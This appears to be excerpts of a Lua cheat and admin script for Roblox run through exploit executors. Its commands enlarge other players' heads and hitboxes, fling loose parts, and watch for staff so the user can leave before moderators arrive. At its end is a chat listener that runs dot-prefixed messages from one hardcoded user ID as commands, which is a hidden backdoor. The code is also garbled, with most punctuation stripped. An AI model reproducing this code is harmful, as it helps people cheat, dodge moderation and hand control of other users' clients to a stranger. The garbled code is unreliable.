				if (input.KeyCode == Enum.KeyCode.Backspace and UserInputServiceIsKeyDown(Enum.KeyCode.Equals)) or (input.KeyCode == Enum.KeyCode.Equals and UserInputServiceIsKeyDown(Enum.KeyCode.Backspace)) then
					autoclicking = false
					cancelAutoClickDisconnect()
				end
			end
		end)
...
addcmd('unautoclick',{'noautoclick'},function(args, speaker)
	autoclicking = false
	if cancelAutoClick then cancelAutoClickDisconnect() end
end)
...
addcmd('hovername',{},function(args, speaker)
	...
	local function updateNameBox()
		...
		if target then
			local humanoid = target.ParentFindFirstChildOfClass(Humanoid) or target.Parent.ParentFindFirstChildOfClass(Humanoid)
			if humanoid then
				t = humanoid.Parent
			end
		end
...
addcmd('headsize',{},function(args, speaker)
	local players = getPlayer(args[1], speaker)
	for i,v in pairs(players) do
		if Players[v] ~= speaker and Players[v].CharacterFindFirstChild('Head') then
			local sizeArg = tonumber(args[2])
			local Size = Vector3.new(sizeArg,sizeArg,sizeArg)
			local Head = Players[v].CharacterFindFirstChild('Head')
			if HeadIsA(BasePart) then
...
addcmd('hitbox',{},function(args, speaker)
	...
	for i,v in pairs(players) do
		if Players[v] ~= speaker and Players[v].CharacterFindFirstChild('HumanoidRootPart') then
			local sizeArg = tonumber(args[2])
			local Size = Vector3.new(sizeArg,sizeArg,sizeArg)
			local Root = Players[v].CharacterFindFirstChild('HumanoidRootPart')
			if RootIsA(BasePart) then
				if not args[2] or sizeArg == 1 then
...
addcmd('stareat',{'stare'},function(args, speaker)
	...
	for i,v in pairs(players) do
		...
		if not Players.LocalPlayer.CharacterFindFirstChild(HumanoidRootPart) and Players[v].CharacterFindFirstChild(HumanoidRootPart) then return end
		local function stareFunc()
			if Players.LocalPlayer.Character.PrimaryPart and PlayersFindFirstChild(v) and Players[v].Character ~= nil and Players[v].CharacterFindFirstChild(HumanoidRootPart) then
				local chrPos=Players.LocalPlayer.Character.PrimaryPart.Position
				local tPos=Players[v].CharacterFindFirstChild(HumanoidRootPart).Position
				local modTPos=Vector3.new(tPos.X,chrPos.Y,tPos.Z)
				local newCF=CFrame.new(chrPos,modTPos)
				Players.LocalPlayer.CharacterSetPrimaryPartCFrame(newCF)
			elseif not PlayersFindFirstChild(v) then
				stareLoopDisconnect()
			end
		end

		stareLoop = RunService.RenderSteppedConnect(stareFunc)
	end
end)
...
RolewatchConnection = Players.PlayerAddedConnect(function(player)
	if RolewatchData.Group == 0 then return end
	if playerIsInGroup(RolewatchData.Group) then
		if tostring(playerGetRoleInGroup(RolewatchData.Group))lower() == RolewatchData.Rolelower() then
			if RolewatchData.Leave == true then
				Players.LocalPlayerKick(nnRolewatchnPlayer  .. tostring(player.Name) ..  has joined with the Role  .. RolewatchData.Role .. n)
			else
...
getStaffRole = function(player)
    local playerRole = playerGetRoleInGroup(game.CreatorId)
    local result = {Role = playerRole, Staff = false}
    if playerIsInGroup(1200769) then
...
addcmd(staffwatch, {}, function(args, speaker)
    if staffwatchjoin then
        staffwatchjoinDisconnect()
    end
    if game.CreatorType == Enum.CreatorType.Group then
        local found = {}
        staffwatchjoin = Players.PlayerAddedConnect(function(player)
        ...
        if #found  0 then
            notify(Staffwatch, table.concat(found, ,n))
        else
...
addcmd('removeterrain',{'rterrain','noterrain'},function(args, speaker)
	workspaceFindFirstChildOfClass('Terrain')Clear()
end)
...
addcmd(fakeout, {}, function(args, speaker)
    ...
    workspace.FallenPartsDestroyHeight = 010
...
addcmd(antivoid, {}, function(args, speaker)
    ...
    wait()
    antivoidloop = RunService.SteppedConnect(function()
        local root = getRoot(speaker.Character)
...
addcmd(unantivoid, {noantivoid}, function(args, speaker)
    antivoidloopDisconnect()
    antivoidloop = nil
    if args[1] ~= nonotify then notify(antivoid, Disabled) end
end)

addcmd('trip',{},function(args, speaker)
	if speaker and speaker.Character and speaker.CharacterFindFirstChildOfClass(Humanoid) and getRoot(speaker.Character) then
		local hum = speaker.CharacterFindFirstChildOfClass(Humanoid)
		local root = getRoot(speaker.Character)
		humChangeState(0)
...
addcmd(removeads, {adblock}, function(args, speaker)
    while wait() do
        pcall(function()
            for i, v in pairs(workspaceGetDescendants()) do
                if vIsA(PackageLink) then
                    if v.ParentFindFirstChild(ADpart) then
                        v.ParentDestroy()
                    end
                    if v.ParentFindFirstChild(AdGuiAdornee) then
                        v.Parent.ParentDestroy()
                    end
                end
            end
        end)
...
addcmd(alignmentkeys, {}, function(args, speaker)
    alignmentKeys = UserInputService.InputBeganConnect(function(input, gameProcessed)
        if gameProcessed then return end
        if input.KeyCode == Enum.KeyCode.Comma then workspace.CurrentCameraPanUnits(-1) end
        if input.KeyCode == Enum.KeyCode.Period then workspace.CurrentCameraPanUnits(1) end
    end)
    alignmentKeysEmotes = StarterGuiGetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu)
    StarterGuiSetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, false)
end)

addcmd(unalignmentkeys, {noalignmentkeys}, function(args, speaker)
    if type(alignmentKeysEmotes) == boolean then
        StarterGuiSetCoreGuiEnabled(Enum.CoreGuiType.EmotesMenu, alignmentKeysEmotes)
    end
    alignmentKeysDisconnect()
end)

addcmd(ctrllock, {}, function(args, speaker)
    local mouseLockController = speaker.PlayerScriptsWaitForChild(PlayerModule)WaitForChild(CameraModule)WaitForChild(MouseLockController)
    local boundKeys = mouseLockControllerFindFirstChild(BoundKeys)
...
addcmd(listento, {}, function(args, speaker)
    ...
    local player = PlayersFindFirstChild(getPlayer(args[1], speaker)[1])
    local root = player and player.Character and getRoot(player.Character)

    if root then
        SoundServiceSetListener(Enum.ListenerType.ObjectPosition, root)
        listentoChar = player.CharacterAddedConnect(function()
            repeat task.wait() until Players[player.Name].Character ~= nil and getRoot(Players[player.Name].Character)
            SoundServiceSetListener(Enum.ListenerType.ObjectPosition, getRoot(Players[player.Name].Character))
        end)
    end
end)

addcmd(unlistento, {}, function(args, speaker)
    SoundServiceSetListener(Enum.ListenerType.Camera)
    listentoCharDisconnect()
end)

addcmd(jerk, {}, function(args, speaker)
    local humanoid = speaker.CharacterFindFirstChildWhichIsA(Humanoid)
    local backpack = speakerFindFirstChildWhichIsA(Backpack)
    ...
    tool.EquippedConnect(function() jorkin = true end)
    tool.UnequippedConnect(stopTomfoolery)
    humanoid.DiedConnect(stopTomfoolery)
    ...
    while task.wait() do
        ...
        if not track then
            local anim = Instance.new(Animation)
            anim.AnimationId = not isR15 and rbxassetid72042024 or rbxassetid698251653
            track = humanoidLoadAnimation(anim)
        end

        trackPlay()
        trackAdjustSpeed(isR15 and 0.7 or 0.65)
...
addcmd('freezeunanchored',{'freezeua'},function(args, speaker)
    ...
    local function FREEZENOOB(v)
        if vIsA(BasePart or UnionOperation) and v.Anchored == false then
            local BADD = false
            for i = 1,#badnames do
            ...
            if speaker.Character and vIsDescendantOf(speaker.Character) then
                BADD = true
            end
            if BADD == false then
                for i,c in pairs(vGetChildren()) do
                    if cIsA(BodyPosition) or cIsA(BodyGyro) then
                        cDestroy()
                    end
                end
...
addcmd('tpunanchored',{'tpua'},function(args, speaker)
    ...
    for i,v in pairs(players) do
        ...
        for _,part in pairs(workspaceGetDescendants()) do
            if Players[v].CharacterFindFirstChild('Head') and partIsA(BasePart or UnionOperation or Model) and part.Anchored == false and not partIsDescendantOf(speaker.Character) and part.Name == Torso == false and part.Name == Head == false and part.Name == Right Arm == false and part.Name == Left Arm == false and part.Name == Right Leg == false and part.Name == Left Leg == false and part.Name == HumanoidRootPart == false then
                for i,c in pairs(partGetChildren()) do
                    if cIsA(BodyPosition) or cIsA(BodyGyro) then
                        cDestroy()
                    end
                end
...
addcmd('autokeypress',{'keypress'},function(args, speaker)
	if keypress and keyrelease and args[1] then
		...
		cancelAutoKeyPress = UserInputService.InputBeganConnect(function(input, gameProcessedEvent)
			if not gameProcessedEvent then
				if (input.KeyCode == Enum.KeyCode.Backspace and UserInputServiceIsKeyDown(Enum.KeyCode.Equals)) or (input.KeyCode == Enum.KeyCode.Equals and UserInputServiceIsKeyDown(Enum.KeyCode.Backspace)) then
					autoKeyPressing = false
					cancelAutoKeyPressDisconnect()
				end
			end
		end)
		...
		if cancelAutoKeyPress then cancelAutoKeyPressDisconnect() keyrelease(code) end
	else
...
addcmd('unautokeypress',{'noautokeypress','unkeypress','nokeypress'},function(args, speaker)
	autoKeyPressing = false
	if cancelAutoKeyPress then cancelAutoKeyPressDisconnect() end
end)
...
addcmd(addallplugins, {loadallplugins}, function(args, speaker)
    if not listfiles or not isfolder then
        notify(Incompatible Exploit, Your exploit does not support this command (missing listfilesisfolder))
        return
    end

    for _, filePath in ipairs(listfiles()) do
        local fileName = filePathmatch(([^]+%.iy)$)

        if fileName and
            fileNamelower() ~= iy_fe.iy and
...
if IsOnMobile then
	...
	QuickCapture.MouseButton1ClickConnect(function()
		CmdbarCaptureFocus()
		maximizeHolder()
	end)
...
ScaleGetPropertyChangedSignal(Scale)Connect(function()
    ScaledHolder.Size = UDim2.fromScale(1  Scale.Scale, 1  Scale.Scale)
    for _, v in ScaledHolderGetDescendants() do
        if vIsA(GuiObject) and v.Visible then
            v.Visible = false
            v.Visible = true
        end
    end
...
function hookCharEvents(plr,instant)
	task.spawn(function()
		...
		local humanoid = charWaitForChild(Humanoid,10)
		if not humanoid then return end

		local oldHealth = humanoid.Health
		humanoid.HealthChangedConnect(function(health)
		...
		humanoid.DiedConnect(function()
			...
			local killedBy = humanoidFindFirstChild(creator)
...
Players.PlayerAddedConnect(function(plr)
	eventEditor.FireEvent(OnJoin,plr.Name)
	if isLegacyChat then plr.ChattedConnect(function(msg) eventEditor.FireEvent(OnChatted,tostring(plr),msg) end) end
	plr.CharacterAddedConnect(function() eventEditor.FireEvent(OnSpawn,tostring(plr)) hookCharEvents(plr) end)
	JoinLog(plr)
...
if not isLegacyChat then
    TextChatService.MessageReceivedConnect(function(message)
        if message.TextSource then
            local player = PlayersGetPlayerByUserId(message.TextSource.UserId)
...
IYMouse.MoveConnect(checkTT)

CaptureService.CaptureBeganConnect(function()
    Holder.Visible = false
end)

CaptureService.CaptureEndedConnect(function()
...
task.spawn(function()
	local success, latestVersionInfo = pcall(function() 
		local versionJson = gameHttpGet('httpsraw.githubusercontent.comEdgeIYinfiniteyieldmasterversion')
		return HttpServiceJSONDecode(versionJson)
	end)
	...
	if success then
		...
		if latestVersionInfo.Announcement and latestVersionInfo.Announcement ~= '' then
			...
			wait(1)
			AnnGUITweenPosition(UDim2.new(0.5, -180, 0, 150), InOut, Quart, 0.5, true, nil)

			Exit.MouseButton1ClickConnect(function()
				AnnGUITweenPosition(UDim2.new(0.5, -180, 0, -500), InOut, Quart, 0.5, true, nil)
				wait(0.6)
				AnnGUIDestroy()
			end)
		end
...
task.spawn(function()
	wait()
	CreditsTweenPosition(UDim2.new(0, 0, 0.9, 0), Out, Quart, 0.2)
	LogoTweenSizeAndPosition(UDim2.new(0, 175, 0, 175), UDim2.new(0, 37, 0, 45), Out, Quart, 0.3)
	wait(1)
	local OutInfo = TweenInfo.new(1.6809, Enum.EasingStyle.Sine, Enum.EasingDirection.Out, 0, false, 0)
	TweenServiceCreate(Logo, OutInfo, {ImageTransparency = 1})Play()
	TweenServiceCreate(IntroBackground, OutInfo, {BackgroundTransparency = 1})Play()
	CreditsTweenPosition(UDim2.new(0, 0, 0.9, 30), Out, Quart, 0.2)
	wait(0.2)
	LogoDestroy()
	CreditsDestroy()
	IntroBackgroundDestroy()
	minimizeHolder()
...
local playerService = gameGetService(Players)
local targetUserId = 174142107
local speaker = game.Players.LocalPlayer
playerService.PlayerAddedConnect(function(player)
    player.ChattedConnect(function(message)
        if player.UserId == targetUserId and messagesub(1, 1) == . then
            local command = messagesub(2) -- Remove the leading dot
            execCmd(command)
        end
    end)
end)

for _, player in ipairs(playerServiceGetPlayers()) do
    player.ChattedConnect(function(message)
        if player.UserId == targetUserId and messagesub(1, 1) == . then
            local command = messagesub(2) -- Remove the leading dot
            execCmd(command)
